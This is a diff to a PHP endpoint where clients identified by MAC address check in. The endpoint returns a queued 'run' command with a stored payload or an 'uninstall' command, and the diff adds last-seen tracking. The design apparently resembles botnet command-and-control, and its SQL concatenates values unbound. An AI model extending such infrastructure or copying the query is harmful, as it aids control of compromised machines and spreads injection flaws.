@@ -55,13 +55,26 @@ function GetCommand($conn, $id)
     }
 }
 
+function UpdateLastSeen($conn , $id)
+{
+    $sql = "update `clients` set `clients`.`LastSeen` = CURRENT_TIMESTAMP where `clients`.`Id` =". $id;
+    $stmt = $conn->prepare($sql);
+    $result = $stmt->execute();    
+}
+
+function RemoveCommand($conn, $id)
+{
+
+}
+
 $mac = $_POST['mac'];
 $id = GetclientId($dbconn, $mac)[0]["Id"];
 $command = GetCommand($dbconn, $id);
 
 if($command == null)
 {
-    $commandarray = array('Message' => 'None');
+    $commandarray = array('Message' => 'none');
+    UpdateLastSeen($dbconn, $id);
     echo(json_encode($commandarray));
     die();
 }
@@ -70,21 +83,14 @@ if($command == null)
 
 if($command[0]["Command"] == "run")
 {
-    $commandarray = array('Command' => 'run', 'Payload' => GetPayload($dbconn, $mac)[0] );
-
-    echo(json_encode($commandarray));
-    die();
+    $commandarray = array('command' => 'run', 'Payload' => GetPayload($dbconn, $mac)[0] );
+    UpdateLastSeen($dbconn, $id);
+    echo(json_encode($commandarray));    
 }
 else if($command[0]["Command"] == "uninstall")
 {
-    $commandarray = array('Command' => 'uninstall');
-
-    echo(json_encode($commandarray));
-    die();
+    $commandarray = array('command' => 'uninstall');
+    UpdateLastSeen($dbconn, $id);
+    echo(json_encode($commandarray));    
 }
-
-
-
-
-
 ?>
